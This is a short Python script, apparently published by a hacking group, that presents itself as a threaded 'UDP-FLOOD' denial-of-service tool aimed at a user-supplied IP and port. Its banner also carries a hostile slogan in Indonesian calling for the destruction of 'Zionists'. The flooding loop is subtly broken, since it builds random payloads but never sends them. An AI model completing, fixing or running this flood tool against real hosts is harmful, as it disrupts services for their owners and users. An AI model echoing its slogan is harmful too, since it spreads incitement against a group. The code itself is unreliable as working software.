import socket
import sys
import threading 
import time
import random


print("             /|====||   ||====||      ==")
print("------------ ||         ||====||    ||==|| ------------")
print("#####.       ||====||   ||          ||  ||        #####")

print("""
[<>] Author1     : Abdullah AL Asad
[<>] Author2     : Unknown
[<>] Author3     : POISON AAI TEAM
[<>]          ><  CYBER PEOPLE ATTACK  ><
""")
    
if len(sys.argv) < 5:
	print("\033[32mUDP-FLOOD")
	sys.exit("Contoh: python " + sys.argv[0] + " <Masukkan: IP> <Masukkan: PORT> <Masukkan: Jumlah Paket> <Masukkan: Waktu>")
	
print("================ BISMILLAHIRAHMANIRRAHIM ================")

print("--------------HANCURKAN ZIONIS LAKNATULLAH--------------")


ip = sys.argv[1]
port = sys.argv[2]
threads = int(sys.argv[3])
times = float(sys.argv[4])

timeout = time.time() + 1 * times

def udp(ip, port, times):
	timeout = time.time() + 1 * times
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
	print(f"\033[32mATTACK with STRONG UDP-FLOOD --> {ip}:{port} time {times}")
	while time.time() < timeout:
		try:
			data = random._urandom(int(random.randint(19240, 65505)))
		except:
			s.close()
	print("\033[31m Connection Error*************00000000**********")

def main():
	global threads
	thread_list = []

	for _ in range(threads):
		th = threading.Thread(target=udp, args=(ip, port, times))
		thread_list.append(th)
		th.start()

	for th in thread_list:
		th.join()

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		print("\033[33m\nDada Bree")
		sys.exit()
